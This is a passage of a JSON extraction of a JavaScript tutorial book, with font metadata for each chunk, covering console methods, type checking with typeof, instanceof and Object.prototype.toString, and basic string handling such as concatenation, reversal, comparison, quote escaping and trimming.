        "text": "You can clear the console window using the  console. clear ()  method. This removes all previously printed messages in the console and may print a message like \"Console was cleared\" in some environments.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 5.8: Displaying objects and XML interactively - console.dir(), console.dirxml()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "console. dir ( object )  displays an interactive list of the properties of the speci\ufb01ed JavaScript object. The output is presented as a hierarchical listing with disclosure triangles that let you see the contents of child objects.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  myObject  =   {      \"foo\" :{          \"bar\" : \"data\"      } }; console. dir ( myObject );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "displays: console. dirxml ( object )  prints an XML representation of the descendant elements of object if possible, or the JavaScript representation if not. Calling  console. dirxml ()  on HTML and XML elements is equivalent to calling",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log () .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": [
            "output_directory\\image_46_1.png"
        ]
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 31",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Example 1:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. dirxml ( document )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "displays:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Example 2:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": [
            "output_directory\\image_47_2.png"
        ]
    },
    {
        "text": "console. log ( document )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "displays:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Example 3:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": [
            "output_directory\\image_47_1.png"
        ]
    },
    {
        "text": "var  myObject  =   {      \"foo\" :{          \"bar\" : \"data\"      } }; console. dirxml ( myObject );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "displays:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 32",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 5.9: Debugging with assertions - console.assert()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": [
            "output_directory\\image_48_1.png"
        ]
    },
    {
        "text": "Writes an error message to the console if the assertion is  false . Otherwise, if the assertion is  true , this does nothing.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. assert ( 'one'   ===   1 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Multiple arguments can be provided after the assertion \u2013 these can be strings or other objects \u2013 that will only be printed if the assertion is  false : console. assert  does  not  throw an  AssertionError  (except in Node.js), meaning that this method is incompatible with most testing frameworks and that code execution will not break on a failed assertion.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": [
            "output_directory\\image_48_2.png",
            "output_directory\\image_48_3.png"
        ]
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 33",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 6: Datatypes in JavaScript",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 6.1: typeof",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "typeof  is the 'o\ufb03cial' function that one uses to get the  type  in JavaScript, however in certain cases it might yield some unexpected results ...",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "1. Strings",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "typeof   \"String\"  or typeof  Date ( 2011 , 01 , 01 )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\"string\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "2. Numbers",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "typeof   42",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\"number\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "3. Bool",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "typeof   true  (valid values  true  and  false ) \"boolean\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "4. Object",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "typeof   {}  or typeof   []  or typeof   null  or typeof   / aaa /  or",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof  Error ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\"object\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "5. Function",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "typeof   function (){}",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\"function\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "6. Unde\ufb01ned",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  var1 ;   typeof  var1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\"unde\ufb01ned\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 34",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 6.2: Finding an object's class",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To \ufb01nd whether an object was constructed by a certain constructor or one inheriting from it, you can use the",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "instanceof  command:",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//We want this function to take the sum of the numbers passed to it //It can be called as sum(1, 2, 3) or sum([1, 2, 3]) and should give 6",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  sum ( ... arguments )   {      if   ( arguments. length   ===   1 )   {          const   [ firstArg ]   =  arguments",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         if   ( firstArg  instanceof  Array )   {   //firstArg is something like [1, 2, 3]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "             return  sum ( ... firstArg )   //calls sum(1, 2, 3)          }      }      return  arguments. reduce (( a ,  b )   =>  a  +  b ) } console. log ( sum ( 1 ,   2 ,   3 ))     //6 console. log ( sum ([ 1 ,   2 ,   3 ]))   //6 console. log ( sum ( 4 ))           //4",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note that primitive values are not considered instances of any class:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( 2   instanceof  Number )          //false console. log ( 'abc'   instanceof  String )      //false console. log ( true   instanceof  Boolean )      //false console. log ( Symbol ()   instanceof  Symbol )   //false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Every value in JavaScript besides  null  and  undefined  also has a  constructor  property storing the function that was used to construct it. This even works with primitives.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "//Whereas instanceof also catches instances of subclasses, //using obj.constructor does not",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ([]   instanceof  Object ,   []   instanceof  Array )             //true true console. log ([] . constructor   ===  Object ,   [] . constructor   ===  Array )   //false true function  isNumber ( value )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     //null.constructor and undefined.constructor throw an error when accessed",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     if   ( value  ===   null   ||  value  ===   undefined )   return   false      return  value. constructor   ===  Number } console. log ( isNumber ( null ),  isNumber ( undefined ))                    //false false console. log ( isNumber ( 'abc' ),  isNumber ([]),  isNumber (()   =>   1 ))       //false false false console. log ( isNumber ( 0 ),  isNumber ( Number ( '10.1' )),  isNumber ( NaN ))   //true true true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 6.3: Getting object type by constructor name",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "When one with  typeof  operator one gets type  object  it falls into somewhat wast category... In practice you might need to narrow it down to what sort of 'object' it actually is and one way to do it is to use object constructor name to get what \ufb02avour of object it actually is:  Object. prototype . toString . call ( yourObject )",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "1. String",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Object. prototype . toString . call ( \"String\" )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\"[object String]\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 35",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "2. Number",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Object. prototype . toString . call ( 42 )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\"[object Number]\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "3. Bool",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Object. prototype . toString . call ( true )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\"[object Boolean]\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "4. Object",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Object. prototype . toString . call ( Object ())  or Object. prototype . toString . call ({})",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\"[object Object]\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "5. Function",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Object. prototype . toString . call ( function (){})",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\"[object Function]\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "6. Date",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Object. prototype . toString . call ( new  Date ( 2015 , 10 , 21 ))",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\"[object Date]\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "7. Regex",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Object. prototype . toString . call ( new  RegExp ())  or Object. prototype . toString . call ( /foo/ );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\"[object RegExp]\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "8. Array",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Object. prototype . toString . call ([]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\"[object Array]\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "9. Null",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Object. prototype . toString . call ( null );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 36",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"[object Null]\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "10. Unde\ufb01ned",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Object. prototype . toString . call ( undefined );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\"[object Unde\ufb01ned]\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "11. Error",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Object. prototype . toString . call ( Error ());",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\"[object Error]\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 37",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 7: Strings",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 7.1: Basic Info and String Concatenation",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Strings in JavaScript can be enclosed in Single quotes  'hello' , Double quotes  \"Hello\"  and (from ES2015, ES6) in Template Literals ( backticks )  `hello` .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  hello   =   \"Hello\" ; var  world   =   'world' ; var  helloW  =  `Hello World` ;                // ES2015 / ES6",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Strings can be created from other types using the  String ()  function.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  intString  =  String ( 32 );   // \"32\" var  booleanString  =  String ( true );   // \"true\" var  nullString  =  String ( null );   // \"null\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Or,  toString ()  can be used to convert Numbers, Booleans or Objects to Strings.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  intString  =   ( 5232 ) . toString ();   // \"5232\" var  booleanString  =   ( false ) . toString ();   // \"false\" var  objString  =   ({}) . toString ();   // \"[object Object]\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Strings also can be created by using  String. fromCharCode  method.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "String. fromCharCode ( 104 , 101 , 108 , 108 , 111 )   //\"hello\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Creating a String object using  new  keyword is allowed, but is not recommended as it behaves like Objects unlike primitive strings.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  objectString  =   new  String ( \"Yes, I am a String object\" ); typeof  objectString ; //\"object\" typeof  objectString. valueOf (); //\"string\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Concatenating Strings",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "String concatenation can be done with the  +  concatenation operator, or with the built-in  concat ()  method on the String object prototype.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  foo  =   \"Foo\" ; var  bar  =   \"Bar\" ; console. log ( foo  +  bar );          // => \"FooBar\" console. log ( foo  +   \" \"   +  bar );    // => \"Foo Bar\" foo. concat ( bar )              // => \"FooBar\" \"a\" . concat ( \"b\" ,   \" \" ,   \"d\" )    // => \"ab d\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Strings can be concatenated with non-string variables but will type-convert the non-string variables into strings.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  string  =   \"string\" ; var  number  =   32 ; var   boolean   =   true ; console. log ( string  +  number  +   boolean );   // \"string32true\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "String Templates",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 38",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Strings can be created using template literals ( backticks )  `hello` .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  greeting  =  `Hello` ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "With template literals, you can do string interpolation using  $ { variable }  inside template literals:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  place  =  `World` ; var  greet  =  `Hello $ { place }! ` console. log ( greet );   // \"Hello World!\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can use String.raw to get backslashes to be in the string without modi\ufb01cation.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "`a\\\\b`  // =  a\\b",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "String. raw `a\\\\b`  // = a\\\\b",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 7.2: Reverse String",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The most \"popular\" way of reversing a string in JavaScript is the following code fragment, which is quite common:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  reverseString ( str )   {      return  str. split ( '' ) . reverse () . join ( '' ); } reverseString ( 'string' );      // \"gnirts\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "However, this will work only so long as the string being reversed does not contain surrogate pairs. Astral symbols, i.e. characters outside of the basic multilingual plane, may be represented by two code units, and will lead this naive technique to produce wrong results. Moreover, characters with combining marks (e.g. diaeresis) will appear on the logical \"next\" character instead of the original one it was combined with.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "'?????.' . split ( '' ) . reverse () . join ( '' );   //fails",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "While the method will work \ufb01ne for most languages, a truly accurate, encoding respecting algorithm for string reversal is slightly more involved. One such implementation is a tiny library called  Esrever , which uses regular expressions for matching combining marks and surrogate pairs in order to perform the reversing perfectly.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Explanation Section Explanation Result str",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The input string",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"string\" String. prototype . split ( deliminator  )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Splits string  str  into an array. The parameter  \"\"  means to split between each character.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ \"s\" , \"t\" , \"r\" , \"i\" , \"n\" , \"g\" ] Array. prototype . reverse ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Returns the array from the split string with its elements in reverse order.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ \"g\" , \"n\" , \"i\" , \"r\" , \"t\" , \"s\" ] Array. prototype . join (  deliminator )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Joins the elements in the array together into a string. The  \"\"  parameter means an empty deliminator (i.e., the elements of the array are put right next to each other).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"gnirts\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Using spread operator",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 39",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  reverseString ( str )   {      return   [ ...String ( str )] . reverse () . join ( '' );      } console. log ( reverseString ( 'stackoverflow' ));    // \"wolfrevokcats\" console. log ( reverseString ( 1337 ));               // \"7331\" console. log ( reverseString ([ 1 ,   2 ,   3 ]));          // \"3,2,1\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Custom  reverse ()  function",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  reverse ( string )   {      var  strRev  =   \"\" ;      for   ( var  i  =  string. length   -   1 ;  i  >=   0 ;  i --)   {         strRev  +=  string [ i ];      }      return  strRev ; } reverse ( \"zebra\" );    // \"arbez\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 7.3: Comparing Strings Lexicographically",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To compare strings alphabetically, use  localeCompare () . This returns a negative value if the reference string is lexicographically (alphabetically) before the compared string (the parameter), a positive value if it comes afterwards, and a value of  0  if they are equal.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   \"hello\" ; var  b  =   \"world\" ; console. log ( a. localeCompare ( b ));   // -1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  >  and  <  operators can also be used to compare strings lexicographically, but they cannot return a value of zero (this can be tested with the  ==  equality operator). As a result, a form of the  localeCompare ()  function can be written like so:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  strcmp ( a ,  b )   {      if ( a  ===  b )   {          return   0 ;      }      if   ( a  >  b )   {          return   1 ;      }      return   - 1 ; } console. log ( strcmp ( \"hello\" ,   \"world\" ));   // -1 console. log ( strcmp ( \"hello\" ,   \"hello\" ));   //  0 console. log ( strcmp ( \"world\" ,   \"hello\" ));   //  1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This is especially useful when using a sorting function that compares based on the sign of the return value (such as",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "sort ). var  arr  =   [ \"bananas\" ,   \"cranberries\" ,   \"apples\" ]; arr. sort ( function ( a ,  b )   {      return  a. localeCompare ( b );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 40 });",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( arr );   // [ \"apples\", \"bananas\", \"cranberries\" ]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 7.4: Access character at index in string",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Use  charAt ()  to get a character at the speci\ufb01ed index in the string.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  string  =   \"Hello, World!\" ; console. log (  string. charAt ( 4 )   );   // \"o\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Alternatively, because strings can be treated like arrays, use the index via  bracket notation .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  string  =   \"Hello, World!\" ; console. log (  string [ 4 ]   );   // \"o\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To get the character code of the character at a speci\ufb01ed index, use  charCodeAt () .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  string  =   \"Hello, World!\" ; console. log (  string. charCodeAt ( 4 )   );   // 111",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note that these methods are all getter methods (return a value). Strings in JavaScript are immutable. In other words, none of them can be used to set a character at a position in the string.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.5: Escaping quotes",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "If your string is enclosed (i.e.) in single quotes you need to escape the inner literal quote with  backslash   \\",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  text  =   'L \\' albero means tree in Italian' ; console. log (  text  );  \\\\  \"L'albero means tree in Italian\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Same goes for double quotes:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  text  =   \"I feel  \\\" high \\\" \" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Special attention must be given to escaping quotes if you're storing HTML representations within a String, since HTML strings make large use of quotations i.e. in attributes:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  content  =   \"<p class= \\\" special \\\" >Hello World!</p>\" ;          // valid String var  hello    =   '<p class=\"special\">I \\' d like to say \"Hi\"</p>' ;   // valid String",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Quotes in HTML strings can also be represented using  & apos ;  (or  & # 39 ; ) as a single quote and  & quot ;  ( or  & # 34 ; ) as double quotes.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  hi     =   \"<p class='special'>I'd like to say &quot;Hi&quot;</p>\" ;   // valid String var  hello  =   '<p class=\"special\">I&apos;d like to say \"Hi\"</p>' ;        // valid String",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note:  The use of  & apos ;  and  & quot ;  will not overwrite double quotes that browsers can automatically place on attribute quotes. For example  <p   class =special >  being made to  <p   class = \"special\" > , using  & quot ;  can lead to",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<p   class = \"\" special \"\" >  where  \\ \"  will be  <p   class = \"special\" > .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "If a string has  '  and  \"  you may want to consider using template literals ( also known as template strings in previous ES6 editions ), which do not require you to escape  '  and  \" . These use backticks ( ` ) instead of single or double quotes.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 41",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  x  =  ` \"Escaping \"  and  ' can become very annoying`;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 7.6: Word Counter",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Say you have a  <textarea>  and you want to retrieve info about the number of: Characters (total) Characters (no spaces) Words Lines",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  wordCount (  val  ){      var  wom  =  val. match ( /\\S+/g );      return   {         charactersNoSpaces  :  val. replace ( /\\s+/g ,   '' ) . length ,         characters          :  val. length ,         words               :  wom  ?  wom. length   :   0 ,         lines               :  val. split ( /\\r*\\n/ ) . length      }; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Use like:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "wordCount (  someMultilineText  ) . words ;     // (Number of words)",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "jsFiddle example",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 7.7: Trim whitespace",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To trim whitespace from the edges of a string, use  String. prototype . trim :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"    some whitespaced string  \" . trim ();    // \"some whitespaced string\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Many JavaScript engines, but  not Internet Explorer , have implemented non-standard  trimLeft  and  trimRight methods. There is a  proposal , currently at Stage 1 of the process, for standardised  trimStart  and  trimEnd methods, aliased to  trimLeft  and  trimRight  for compatibility.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Stage 1 proposal",
